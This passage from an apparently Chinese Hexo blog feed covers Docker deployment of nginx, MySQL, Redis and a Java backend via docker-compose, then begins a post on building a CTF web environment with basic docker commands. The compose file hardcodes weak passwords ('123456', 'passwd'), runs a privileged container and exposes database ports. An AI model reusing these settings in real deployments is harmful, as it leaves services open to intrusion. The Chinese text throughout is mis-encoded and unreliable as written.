encoded in a special way (much more memory efficient) when they</span><br><span class="line"># have at max a given numer of elements, and the biggest element does not</span><br><span class="line"># exceed a given threshold. You can configure this limits with the following</span><br><span class="line"># configuration directives.</span><br><span class="line"># æŒ‡å®šåœ¨è¶…è¿‡ä¸€å®šçš„æ•°é‡æˆ–è€…æœ€å¤§çš„å…ƒç´ è¶…è¿‡æŸä¸€ä¸´ç•Œå€¼æ—¶ï¼Œé‡‡ç”¨ä¸€ç§ç‰¹æ®Šçš„å“ˆå¸Œç®—æ³•</span><br><span class="line"># hash-max-zipmap-entries 512</span><br><span class="line"># hash-max-zipmap-value 64</span><br><span class="line"> </span><br><span class="line"># Similarly to hashes, small lists are also encoded in a special way in order</span><br><span class="line"># to save a lot of space. The special representation is only used when</span><br><span class="line"># you are under the following limits:</span><br><span class="line">list-max-ziplist-entries 512</span><br><span class="line">list-max-ziplist-value 64</span><br><span class="line"> </span><br><span class="line"># Sets have a special encoding in just one case: when a set is composed</span><br><span class="line"># of just strings that happens to be integers in radix 10 in the range</span><br><span class="line"># of 64 bit signed integers.</span><br><span class="line"># The following configuration setting sets the limit in the size of the</span><br><span class="line"># set in order to use this special memory saving encoding.</span><br><span class="line">set-max-intset-entries 512</span><br><span class="line"> </span><br><span class="line"># Similarly to hashes and lists, sorted sets are also specially encoded in</span><br><span class="line"># order to save a lot of space. This encoding is only used when the length and</span><br><span class="line"># elements of a sorted set are below the following limits:</span><br><span class="line">zset-max-ziplist-entries 128</span><br><span class="line">zset-max-ziplist-value 64</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"># æŒ‡å®šæ˜¯å¦æ¿€æ´»é‡ç½®å“ˆå¸Œï¼Œé»˜è®¤ä¸ºå¼€å¯</span><br><span class="line">activerehashing yes</span><br><span class="line"> </span><br><span class="line">################################## INCLUDES ###################################</span><br><span class="line"> </span><br><span class="line"># æŒ‡å®šåŒ…å«å…¶ä»–çš„é…ç½®æ–‡ä»¶ï¼Œå¯ä»¥åœ¨åŒä¸€ä¸»æœºä¸Šå¤šä¸ªRediså®ä¾‹ä¹‹é—´ä½¿ç”¨åŒä¸€ä»½é…ç½®æ–‡ä»¶ï¼Œè€ŒåŒæ—¶å„å®ä¾‹åˆæ‹¥æœ‰è‡ªå·±çš„ç‰¹å®šé…ç½®æ–‡ä»¶</span><br><span class="line"># include /path/to/local.conf</span><br><span class="line"># include /path/to/other.conf</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="å››ã€åç«¯Java">å››ã€åç«¯Java</h2><p>åç«¯é¡¹ç›®ä¸­æ•°æ®åº“<code>ipåœ°å€</code>ä½ç½®å¡«å†™ymlæ–‡ä»¶ä¸­å®šä¹‰çš„<code>æœåŠ¡å</code>ï¼Œå®ƒä¼šè‡ªåŠ¨è®¾ç½®ä¸ºymlæ–‡ä»¶åˆ†é…çš„ipï¼Œå¦‚å›¾ğŸ‘‡</p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20220426/%E5%90%8E%E7%AB%AF.5xsukay8jv00.jpg" alt="åç«¯é¡¹ç›®"></p><p>docker-composeå†…åç«¯æœåŠ¡</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">myweb:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">web/test1</span>     <span class="comment"># é•œåƒå</span></span><br><span class="line">    <span class="attr">build:</span> <span class="string">.</span>        <span class="comment"># è¡¨ç¤ºä»¥å½“å‰ç›®å½•ä¸‹çš„Dockerfileå¼€å§‹æ„å»ºé•œåƒ</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;8090:8090&quot;</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">mysql</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">redis</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="attr">data_security:</span></span><br><span class="line">        <span class="attr">ipv4_address:</span> <span class="number">10.1</span><span class="number">.0</span><span class="number">.4</span></span><br></pre></td></tr></table></figure><p>é€šè¿‡<code>depends_on</code>æ¥å®šä¹‰æœåŠ¡ä¹‹é—´çš„ä¾èµ–å…³ç³»ï¼Œä¼šä¾æ®ä¾èµ–å…³ç³»å¯åŠ¨æœåŠ¡ï¼Œåç«¯æœåŠ¡è¦åœ¨æ•°æ®åº“mysqlã€rediså¯åŠ¨ä¹‹åå¯åŠ¨æœåŠ¡</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> java:<span class="number">8</span></span><br><span class="line"><span class="comment">#æš´éœ²çš„ç«¯å£</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">8090</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#æŠŠæ‰“æˆçš„jaråŒ…æ›´åä¸º app.jar</span></span><br><span class="line"><span class="keyword">ADD</span><span class="bash"> *.jar app.jar</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#åœ¨åˆ›å»ºapp.jar</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> bash -c <span class="string">&#x27;touch /app.jar&#x27;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#æ‰§è¡Œçš„è¿è¡ŒjaråŒ…å‘½ä»¤</span></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="bash"> [<span class="string">&quot;java&quot;</span>, <span class="string">&quot;-jar&quot;</span>, <span class="string">&quot;/app.jar&quot;</span>]</span></span><br></pre></td></tr></table></figure><div class="note danger flat"><p>è¿™é‡Œå¦‚æœé‡æ–°ä¿®æ”¹äº†åç«¯é¡¹ç›®ä¸­æ•°æ®åº“çš„ipï¼Œä¸”å·²ç»åˆ›å»ºäº†åç«¯é•œåƒï¼Œè¯·å…ˆåˆ é™¤å·²ç»åˆ›å»ºäº†çš„åç«¯é•œåƒï¼ˆæˆ‘è¿™é‡Œæ˜¯<code>myweb</code>ï¼‰ï¼Œä¸ç„¶æ•°æ®åº“çš„ipåœ°å€æ˜¯ä¸ä¼šæ›´æ–°çš„ã€‚</p></div><h2 id="äº”ã€å®¹å™¨é—´é€šä¿¡">äº”ã€å®¹å™¨é—´é€šä¿¡</h2><p>Dockerå®¹å™¨é—´é€šä¿¡æ˜¯å¾ˆå¸¸è§çš„æ“ä½œï¼Œå®ƒå…è®¸ä¸€ä¸ªå®¹å™¨ä½¿ç”¨å¦ä¸€ä¸ªå®¹å™¨æä¾›çš„æœåŠ¡ã€‚</p><p>ä¸€èˆ¬åœ¨ä½¿ç”¨docker-composeå¯åŠ¨æœåŠ¡æ—¶ï¼Œè¢«åŒä¸€ä¸ªdocker-compose.ymlå®šäºçš„æœåŠ¡ï¼ˆå®¹å™¨ï¼‰ä¼šè¿è¡Œåœ¨ä¸€ä¸ªéš”ç¦»ç¯å¢ƒä¸­ï¼Œä¹Ÿå°±æ˜¯è¯´åœ¨è¿™ä¸ªç¯å¢ƒä¸­çš„å®¹å™¨æ˜¯ä¸èƒ½ç›´æ¥è®¿é—®ï¼ˆå¦‚æœæ²¡æœ‰è®¾ç½®çš„è¯ï¼‰</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">networks:</span></span><br><span class="line">  <span class="attr">data_security:</span>      <span class="comment"># è‡ªå®šä¹‰ç½‘ç»œåå­—</span></span><br><span class="line">    <span class="attr">driver:</span> <span class="string">bridge</span> </span><br><span class="line">    <span class="attr">ipam:</span></span><br><span class="line">      <span class="attr">config:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">subnet:</span> <span class="number">10.1</span><span class="number">.0</span><span class="number">.0</span><span class="string">/24</span>       <span class="comment">#è‡ªå®šä¹‰å›ºå®šå®¹å™¨ip å®ç°å®¹å™¨é—´é€šè®¯ï¼Œå¢å¼ºdocker-composeé¡¹ç›®å¯ç§»æ¤æ€§</span></span><br></pre></td></tr></table></figure><p><code>æ•°æ®åº“</code>å’Œ<code>springbooté¡¹ç›®</code>åˆ†åˆ«ä½¿ç”¨<code>ä¸åŒçš„dockerå®¹å™¨</code>å¯åŠ¨ï¼Œè¿™æ ·ä¼šå¯¼è‡´é¡¹ç›®è®¿é—®æ•°æ®åº“å—é™ï¼Œè¿™é‡Œå°†docker-composeå†…æ‰€æœ‰æœåŠ¡éƒ½è®¾ç½®åœ¨åŒä¸€ç½‘æ®µä¸­ï¼Œå¯ä»¥ç®¡ç†å®¹å™¨åŠé€šä¿¡é—®é¢˜ã€‚ ï¼ˆåœ¨å…¶ä»–æœåŠ¡ä¸­ä¸è¦è®¾ç½®IPåœ°å€ä¸ºx.x.x.1ï¼Œå®¹æ˜“æŠ¥é”™ï¼‰</p><p>å¯ä»¥è¿›å…¥åˆ›å»ºçš„dockerç½‘ç»œæŸ¥çœ‹ä¸€ä¸‹ç›¸å…³ä¿¡æ¯ğŸ‘‡</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker network ls        # è¾“å‡ºdockerç½‘ç»œåˆ—è¡¨</span><br><span class="line">docker network inspect ç½‘ç»œid# æŸ¥çœ‹æŒ‡å®šç½‘ç»œè¯¦æƒ…</span><br><span class="line">docker network rm ç½‘ç»œid# åˆ é™¤æŒ‡å®šç½‘ç»œ</span><br></pre></td></tr></table></figure><h2 id="å…­ã€å®Œæ•´ä»£ç ">å…­ã€å®Œæ•´ä»£ç </h2><p>docker-compose.yml</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;3&#x27;</span><span class="comment"># è‡ªå®šä¹‰ç‰ˆæœ¬å·ï¼Œä¸€èˆ¬æ˜¯2ï¼Œ3</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">nginx:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">nginx:latest</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">nginx</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./config/nginx/nginx.conf:/etc/nginx/nginx.conf</span>   <span class="comment"># nginxé…ç½®æ–‡ä»¶</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./config/html/dist/:/usr/share/nginx/html/</span>        <span class="comment"># å‰ç«¯æ‰“åŒ…æ–‡ä»¶</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;8080:80&quot;</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="attr">data_security:</span></span><br><span class="line">        <span class="attr">ipv4_address:</span> <span class="number">192.128</span><span class="number">.0</span><span class="number">.8</span></span><br><span class="line">    <span class="attr">privileged:</span> <span class="literal">true</span>      <span class="comment"># è¿™ä¸ªå¿…é¡»è¦ï¼Œè§£å†³nginxçš„æ–‡ä»¶è°ƒç”¨çš„æƒé™é—®é¢˜</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">mysql:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">mysql:8.0.12</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">mysql</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">TZ=Asia/Shanghai</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">MYSQL_ROOT_PASSWORD=123456</span>                <span class="comment">#æ•°æ®åº“åˆå§‹è¯ä¸ºrootç”¨æˆ·è®¾ç½®çš„é»˜è®¤å¯†ç </span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">MYSQL_DATABASE=xx</span><span class="comment"># é¡¹ç›®æ•°æ®åº“å</span></span><br><span class="line">      <span class="comment"># - MYSQL_USER:                           #è‡ªå®šä¹‰æ•°æ®åº“çš„ç”¨æˆ·ï¼Œæƒé™åªä½œç”¨äºMYSQL_DATABASEé…ç½®çš„æ•°æ®åº“</span></span><br><span class="line">      <span class="comment"># - MYSQL_PASSWORD:                    #è‡ªå®šä¹‰æ•°æ®åº“çš„ç”¨æˆ·ï¼Œæƒé™åªä½œç”¨äºMYSQL_DATABASEé…ç½®çš„æ•°æ®åº“</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="comment"># - ./config/mysql/cnf/my.cnf:/etc/my.cnf</span></span><br><span class="line">      <span class="comment"># - ./config/mysql/data:/var/lib/mysql</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./config/mysql/init/xx.sql:/docker-entrypoint-initdb.d/xx.sql</span><span class="comment"># è‡ªå·±æ•°æ®åº“sqlæ–‡ä»¶</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;3306:3306&quot;</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="attr">data_security:</span></span><br><span class="line">        <span class="attr">ipv4_address:</span> <span class="number">192.128</span><span class="number">.0</span><span class="number">.2</span></span><br><span class="line">    <span class="attr">command:</span> <span class="string">--default-authentication-plugin=mysql_native_password</span> <span class="string">--character-set-server=utf8mb4</span> <span class="string">--collation-server=utf8mb4_unicode_ci</span> <span class="string">--sql-mode=&#x27;&#x27;</span> <span class="string">--max-execution-time=1000</span></span><br><span class="line">        </span><br><span class="line">  <span class="attr">redis:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">redis:latest</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">redis</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">TZ=Asia/Shanghai</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">REDIS_ROOT_PASSWORD=passwd</span><span class="comment"># rediså¯†ç </span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./config/redis/conf/redis.conf:/etc/redis/redis.conf</span>   <span class="comment">#æŒ‚è½½redis.confä¸ç„¶åç»­é‡å¯rediså¯†ç ä¼šå¤±æ•ˆ</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./config/redis/data:/data</span></span><br><span class="line">      <span class="comment"># - ./config/redis/log/redis.log:/logs/redis.log</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;6379:6379&quot;</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="attr">data_security:</span></span><br><span class="line">        <span class="attr">ipv4_address:</span> <span class="number">192.128</span><span class="number">.0</span><span class="number">.3</span></span><br><span class="line">    <span class="comment"># privileged: true</span></span><br><span class="line">    <span class="attr">command:</span> <span class="string">redis-server</span> <span class="string">/etc/redis/redis.conf</span> <span class="string">--requirepass</span> <span class="string">passwd</span>          <span class="comment">#æŒ‡å®šé…ç½®æ–‡ä»¶å¯åŠ¨redis</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">myweb:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">web/test1</span>     <span class="comment"># é•œåƒå</span></span><br><span class="line">    <span class="attr">build:</span> <span class="string">.</span>        <span class="comment"># è¡¨ç¤ºä»¥å½“å‰ç›®å½•ä¸‹çš„Dockerfileå¼€å§‹æ„å»ºé•œåƒ</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;8090:8090&quot;</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">mysql</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">redis</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="attr">data_security:</span></span><br><span class="line">        <span class="attr">ipv4_address:</span> <span class="number">192.128</span><span class="number">.0</span><span class="number">.4</span></span><br><span class="line">    </span><br><span class="line"><span class="attr">networks:</span></span><br><span class="line">  <span class="attr">data_security:</span>      <span class="comment"># è‡ªå®šä¹‰ç½‘ç»œåå­—</span></span><br><span class="line">    <span class="attr">driver:</span> <span class="string">bridge</span> </span><br><span class="line">    <span class="attr">ipam:</span></span><br><span class="line">      <span class="attr">config:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">subnet:</span> <span class="number">192.128</span><span class="number">.0</span><span class="number">.0</span><span class="string">/16</span>           <span class="comment">#è‡ªå®šä¹‰å›ºå®šå®¹å™¨ip å®ç°å®¹å™¨é—´é€šè®¯ï¼Œå¢å¼ºdocker-composeé¡¹ç›®å¯ç§»æ¤æ€§</span></span><br></pre></td></tr></table></figure><p>åœ¨docker-compose.ymlæ–‡ä»¶ç›®å½•ä¸‹ç›´æ¥è¾“å…¥ç¬¬ä¸€æ¡å‘½ä»¤å¯åŠ¨æœåŠ¡</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up# å¼€å¯æœåŠ¡å¹¶æ˜¾ç¤ºæ—¥å¿—</span><br><span class="line">docker-compose up -d        # åå°å¼€å¯æœåŠ¡</span><br><span class="line">docker logs -f å®¹å™¨id        # æŸ¥çœ‹æŒ‡å®šå·²å¼€å¯å®¹å™¨æ—¥å¿—</span><br><span class="line">docker-compose down# ä¸€é”®å…³é—­æ‰€æœ‰æœåŠ¡å¹¶æ¸…é™¤å·²é€€å‡ºçš„å®¹å™¨</span><br></pre></td></tr></table></figure><h2 id="ä¸ƒã€è¿è¡Œæˆªå›¾">ä¸ƒã€è¿è¡Œæˆªå›¾</h2><p>å¦‚å›¾ğŸ‘‡ï¼ŒæœåŠ¡å¯åŠ¨æ­£å¸¸ï¼Œæµè§ˆå™¨è¾“å…¥<code>http://your-ip:8080</code>æŸ¥çœ‹æ•ˆæœï¼Œæ²¡æœ‰æ•ˆæœçš„æŸ¥çœ‹ä¸€ä¸‹é˜²ç«å¢™æ˜¯å¦å…³äº†ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20220426/%E8%BF%90%E8%A1%8C%E6%88%AA%E5%9B%BE.1kz4bfbtf1z4.jpg" alt="è¿è¡Œæˆªå›¾"></p>]]></content>
      
      
      <categories>
          
          <category> ç¯å¢ƒæ­å»º </category>
          
          <category> Docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç¯å¢ƒæ­å»º </tag>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Dockeræ­å»ºCTFï¼ˆWebï¼‰ç¯å¢ƒ</title>
      <link href="/posts/f7e6aba0/"/>
      <url>/posts/f7e6aba0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><div class="note info no-icon flat"><p>CTFéœ€è¦webç¯å¢ƒï¼Œé€šè¿‡dockerå¯ä»¥æ›´å¥½æ›´å¿«åœ°åˆ›å»ºä¸€ä¸ªç‹¬ç«‹çš„å®¹å™¨ï¼Œä½œä¸ºé€‰æ‰‹çš„åŠ¨æ€é¶æœºã€‚<br>Dockerï¼Œæ˜¯å…·å¤‡æœ‰ç®€åŒ–é…ç½®ã€å…¨å¹³å°ã€æé«˜æ•ˆç‡ã€æ–¹ä¾¿å…±äº«ã€å¿«é€Ÿéƒ¨ç½²ç­‰ç‰¹ç‚¹çš„ã€‚<br>å»å¹´å­¦äº†dockerï¼Œä¸€ç›´æƒ³ç”¨å®ƒæ¥åˆ›å»ºä¸€ä¸ªæœ¬åœ°webç¯å¢ƒã€‚<br>æ­£å¥½èµ¶ä¸Šäº†å‡ºé¢˜æ—¶æœºï¼Œé¡ºä¾¿æ€»ç»“ä¸€ä¸‹è¿‘æœŸçš„dockerç¬”è®°ã€‚</p></div><h2 id="ä¸€ã€DockeråŸºæœ¬å‘½ä»¤">ä¸€ã€DockeråŸºæœ¬å‘½ä»¤</h2><p>çº¯ç¬”è®°ï¼Œå…¶å®ä¹Ÿå·²ç»å¤Ÿç”¨äº†ã€‚ è¯¦ç»†èµ„æ–™è¯·ç§»æ­¥ä¸‹æ–¹é“¾æ¥ğŸ”—</p><ul><li><p><a href="https://dockerdocs.cn/get-started/overview/">dockerå®˜æ–¹æ–‡æ¡£</a></p></li><li><p><a href="https://yeasy.gitbook.io/docker_practice/image/commit">Docker â€” ä»å…¥é—¨åˆ°å®è·µ</a></p></li></ul><h3 id="æ‹‰å–æŸ¥çœ‹ç¯‡">æ‹‰å–æŸ¥çœ‹ç¯‡</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">docker pull ubuntu:16.04                # æ‹‰å–å¯¹åº”é•œåƒ</span><br><span class="line"></span><br><span class="line">docker images                # æŸ¥çœ‹å½“å‰ç³»ç»Ÿä¸­å­˜åœ¨é•œåƒ </span><br><span class="line"></span><br><span class="line">docker ps                          # æŸ¥çœ‹è¿è¡Œä¸­çš„å®¹å™¨</span><br><span class="line">docker ps -a                       # æŸ¥çœ‹æ‰€æœ‰å®¹å™¨ï¼ˆåŒ…æ‹¬å·²ç»“æŸè¿è¡Œçš„ï¼‰</span><br><span class="line"></span><br><span class="line">docker cp ä¸»æœºæ–‡ä»¶å å®¹å™¨id:å®¹å™¨æŒ‡å®šç›®å½•  # å°†ä¸»æœºæ–‡ä»¶å¤åˆ¶åˆ°æŒ‡å®šä½ç½®ï¼Œåä¹‹åˆ™äº¤æ¢ä½ç½®</span><br></pre></td></tr></table></figure><h3 id="è¿è¡Œç¯‡">è¿è¡Œç¯‡</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker run -it å®¹å™¨id      # ä»¥äº¤äº’æ¨¡å¼è¿è¡Œå®¹å™¨ï¼Œä¸ºå®¹å™¨é‡æ–°åˆ†é…ä¸€ä¸ªä¼ªè¾“å…¥ç»ˆç«¯</span><br><span class="line">docker run -d å®¹å™¨id      # åå°è¿è¡Œå®¹å™¨ï¼Œå¹¶è¿”å›å®¹å™¨ID</span><br></pre></td></tr></table></figure><div class="hide-toggle" style="border: 1px solid #e8fafe"><div class="hide-button toggle-title" style="background-color: #e8fafe;color: color"><i class="fas fa-caret-right fa-fw"></i><span>docker runå‘½ä»¤è¯¦æƒ…</span></div>    <div class="hide-content"><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run [OPTIONS] IMAGE [COMMAND] [ARG...]</span><br></pre></td></tr></table></figure><p>OPTIONSè¯´æ˜ï¼š</p><ul><li><strong>-a stdin:</strong> æŒ‡å®šæ ‡å‡†è¾“å…¥è¾“å‡ºå†…å®¹ç±»å‹ï¼Œå¯é€‰ STDIN/STDOUT/STDERR ä¸‰é¡¹ï¼›</li><li><strong>-d:</strong> åå°è¿è¡Œå®¹å™¨ï¼Œå¹¶è¿”å›å®¹å™¨IDï¼›</li><li><strong>-i:</strong> ä»¥äº¤äº’æ¨¡å¼è¿è¡Œå®¹å™¨ï¼Œé€šå¸¸ä¸ -t åŒæ—¶ä½¿ç”¨ï¼›</li><li><strong>-P:</strong> éšæœºç«¯å£æ˜ å°„ï¼Œå®¹å™¨å†…éƒ¨ç«¯å£<strong>éšæœº</strong>æ˜ å°„åˆ°ä¸»æœºçš„ç«¯å£</li><li><strong>-p:</strong> æŒ‡å®šç«¯å£æ˜ å°„ï¼Œæ ¼å¼ä¸ºï¼šä¸»æœº(å®¿ä¸»)ç«¯å£:å®¹å™¨ç«¯å£</li><li><strong>-t:</strong> ä¸ºå®¹å™¨é‡æ–°åˆ†é…ä¸€ä¸ªä¼ªè¾“å…¥ç»ˆç«¯ï¼Œé€šå¸¸ä¸ -i åŒæ—¶ä½¿ç”¨ï¼›</li><li><strong>â€“name=â€œnginx-lbâ€:</strong> ä¸ºå®¹å™¨æŒ‡å®šä¸€ä¸ªåç§°ï¼›</li><li><strong>â€“dns 8.8.8.8:</strong> æŒ‡å®šå®¹å™¨ä½¿ç”¨çš„DNSæœåŠ¡å™¨ï¼Œé»˜è®¤å’Œå®¿ä¸»ä¸€è‡´ï¼›</li><li><strong>â€“dns-search <a href="http://example.com">example.com</a>:</strong> æŒ‡å®šå®¹å™¨DNSæœç´¢åŸŸåï¼Œé»˜è®¤å’Œå®¿ä¸»ä¸€è‡´ï¼›</li><li><strong>-h â€œmarsâ€:</strong> æŒ‡å®šå®¹å™¨çš„hostnameï¼›</li><li><strong>-e username=â€œritchieâ€:</strong> è®¾ç½®ç¯å¢ƒå˜é‡ï¼›</li><li><strong>â€“env-file=[]:</strong> ä»æŒ‡å®šæ–‡ä»¶è¯»å…¥ç¯å¢ƒå˜é‡ï¼›</li><li><strong>â€“cpuset=â€œ0-2â€ or --cpuset=â€œ0,1,2â€:</strong> ç»‘å®šå®¹å™¨åˆ°æŒ‡å®šCPUè¿è¡Œï¼›</li><li><strong>-m</strong> :è®¾ç½®å®¹å™¨ä½¿ç”¨å†…å­˜æœ€å¤§å€¼ï¼›</li><li><strong>â€“net=â€œbridgeâ€:</strong> æŒ‡å®šå®¹å™¨çš„ç½‘ç»œè¿æ¥ç±»å‹ï¼Œæ”¯æŒ bridge/host/none/container: å››ç§ç±»å‹ï¼›</li><li><strong>â€“link=[]:</strong> æ·»åŠ é“¾æ¥åˆ°å¦ä¸€ä¸ªå®¹å™¨ï¼›</li><li><strong>â€“expose=[]:</strong> å¼€æ”¾ä¸€ä¸ªç«¯å£æˆ–ä¸€ç»„ç«¯å£ï¼›</li><li><strong>â€“volume , -v:</strong> ç»‘å®šä¸€ä¸ªå·</li></ul></div></div><h3 id="åœæ­¢åˆ é™¤ç¯‡">åœæ­¢åˆ é™¤ç¯‡</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">docker stop å®¹å™¨id             #åœæ­¢æŒ‡å®šå®¹å™¨</span><br><span class="line">docker stop $(docker ps -a -q)      #åœæ­¢æ‰€æœ‰å·²ç»è¿è¡Œçš„å®¹å™¨</span><br><span class="line"></span><br><span class="line">docker rm å®¹å™¨id               #åˆ é™¤æŒ‡å®šå®¹å™¨ï¼Œåˆ é™¤å‰å…ˆåœæ­¢</span><br><span class="line">docker rm $(docker ps -a -q)        #åˆ é™¤æ‰€æœ‰å·²ç»åœæ­¢çš„æŒ‡ä»¤</span><br><span class="line"></span><br><span class="line">docker rmi é•œåƒid    # åˆ é™¤æŒ‡å®šé•œåƒ</span><br></pre></td></tr></table></figure><h3 